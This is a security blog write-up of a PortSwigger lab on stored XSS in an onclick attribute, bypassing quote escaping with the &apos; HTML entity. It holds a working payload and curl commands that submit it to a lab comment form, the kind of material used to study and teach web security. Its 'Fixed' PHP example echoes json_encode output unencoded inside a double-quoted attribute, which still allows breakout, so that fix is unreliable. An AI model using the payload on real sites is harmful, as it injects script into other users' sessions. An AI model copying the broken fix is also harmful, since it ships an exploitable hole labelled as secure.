---
layout: post
title: "Stored XSS into onclick Event with HTML Entity Bypass"
date: 2027-06-14 09:00:00 -0500
categories: [Web Security, XSS]
tags: [xss, stored-xss, onclick, html-entities, portswigger, cwe-79]
---

## Lab Overview

This PortSwigger Web Security Academy lab covers a stored XSS where the server applies aggressive character-level escaping — angle brackets and double quotes are HTML-encoded, and both single quotes and backslashes are backslash-escaped. The classic JS string breakout techniques are all blocked at the character level. The escape hatch: HTML entities in event handler attribute values are decoded by the browser's HTML parser **before** the JavaScript engine executes the handler.

**Vulnerability:** Stored Cross-Site Scripting (CWE-79)  
**Difficulty:** Practitioner  
**Status:** Solved

---

## The Injection Context

A blog comment form's "website" field gets stored and reflected into an `onclick` attribute:

```html
<a onclick="var tracker={track(){}};tracker.track('WEBSITE');">
```

The server filters:
- `<`, `>` → HTML-encoded (no tag injection)
- `"` → HTML-encoded (no double-quote attribute breakout)
- `'` → `\'` (single-quote JS string breakout blocked)
- `\` → `\\` (backslash escape-of-the-escape blocked)

With both `'` and `\` neutralised, the standard JS string context attacks don't work.

---

## Why HTML Entity `&apos;` Works

HTML event handler attributes go through two browser processing steps:

1. **HTML parser** reads the attribute value and decodes HTML entities  
2. **JavaScript engine** executes the decoded string as code

The server's backslash-escaping only targets the raw `'` character. The entity `&apos;` is not a single quote — it's a six-character ASCII string — so it passes through unescaped and is stored verbatim in the onclick attribute.

When a user's browser renders the page, step 1 decodes `&apos;` → `'`. Step 2 then executes the resulting JavaScript, which now contains unescaped quotes that break out of the string.

This is a different mechanism than the `</script>` closure trick (which exploits the HTML parser scanning for the raw byte sequence `</script>` inside a `<script>` block). Here we're inside an **event handler attribute**, not a script block, and we're using HTML entity decoding rather than tag closure.

---

## Working Payload

Submit the comment form with the website field set to:

```
http://foo?&apos;-alert(1)-&apos;
```

The server stores it unchanged. The page renders:

```html
<a onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">
```

After HTML entity decoding, the browser executes:

```javascript
var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');
```

The `'` characters break the string and `-alert(1)-` executes.

---

## curl Solve

```bash
# 1. Get CSRF token + session
curl -sk -c cookies.txt "https://TARGET.web-security-academy.net/post?postId=1" \
  | grep -oP 'name="csrf" value="\K[^"]+'

# 2. Submit stored XSS payload
curl -sk -b cookies.txt -c cookies.txt \
  -X POST "https://TARGET.web-security-academy.net/post/comment" \
  --data-urlencode "csrf=CSRF_TOKEN" \
  --data-urlencode "postId=1" \
  --data-urlencode "comment=test" \
  --data-urlencode "name=test" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "website=http://foo?&apos;-alert(1)-&apos;"
```

The lab marks as solved when the stored payload fires in any browser that views the blog post.

---

## The Fix

Context-aware output encoding: when reflecting a value into a JavaScript string inside an HTML event attribute, apply **JavaScript string encoding** (escape `\`, `'`, `"`, and critically `&` → `\x26`) before or instead of HTML encoding. Simply HTML-encoding the surrounding characters is insufficient — the HTML parser decodes attribute values before JS runs, so any character achievable via HTML entity is also injectable.

```php
// Vulnerable: only HTML-escaping applied
$safe = htmlspecialchars($website);
echo "<a onclick=\"tracker.track('$safe')\">";

// Fixed: JS-encode the value for its execution context
$safe = json_encode($website);  // produces "\"http://...\""
echo "<a onclick=\"tracker.track($safe)\">";
```

**Reference:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) · [PortSwigger XSS in HTML attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)
